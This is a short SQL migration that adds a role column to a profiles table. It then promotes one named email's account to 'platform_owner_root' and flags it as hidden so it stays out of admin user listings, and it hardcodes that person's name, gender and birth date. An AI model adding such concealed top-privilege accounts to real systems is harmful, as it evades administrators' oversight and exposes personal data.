-- Add primary_role column to profiles table
ALTER TABLE public.profiles
ADD COLUMN IF NOT EXISTS primary_role text;

-- Manual platform owner creation script
-- This will mark any user with the email as hidden and set them as platform owner
UPDATE public.profiles
SET 
  is_hidden = true,
  primary_role = 'platform_owner_root',
  full_name = 'Andi Mekrizvani',
  gender = 'male',
  date_of_birth = '1988-11-30'
WHERE email = 'A.mekrizvani@proton.me';

-- Add a comment to document this special account
COMMENT ON COLUMN public.profiles.is_hidden IS 'Set to true for system accounts that should not appear in admin user tables';